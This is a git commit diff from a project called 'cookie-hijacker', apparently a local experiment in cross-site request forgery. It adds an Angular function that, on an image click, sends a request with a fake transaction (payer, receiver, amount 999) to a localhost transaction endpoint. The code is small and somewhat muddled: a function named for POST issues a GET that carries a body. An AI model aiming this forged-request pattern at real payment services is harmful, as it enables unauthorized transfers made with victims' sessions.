fbab28480914744bb1e83031571a99501160dfb7
Posch <Helmut.Posch@capco.com>
2020-01-27 16:27:25 +0100

    Implemented experiment of GET request after click on image

--- cookie-hijacker/src/app/app.component.ts
+++ cookie-hijacker/src/app/app.component.ts
@@ -9,4 +9,24 @@ import {CookieService} from 'ngx-cookie-service';
 export class AppComponent {
 
   title = 'cookie-hijacker';
+
+  executePostCall() {
+    const xmlhttp = new XMLHttpRequest();
+
+    xmlhttp.onreadystatechange = function() {
+      if (xmlhttp.readyState === XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
+        if (xmlhttp.status === 200) {
+          alert('200');
+        } else if (xmlhttp.status === 400) {
+          alert('There was an error 400');
+        } else {
+          alert('something else other than 200 was returned');
+        }
+      }
+    };
+
+    xmlhttp.open("GET", "https://localhost:8080/api/transaction", true);
+    xmlhttp.setRequestHeader("Content-type", "application/json");
+    xmlhttp.send("date=2019-01-15T08:09:12&payer=1&receiver=2&amount=999");
+  }
 }
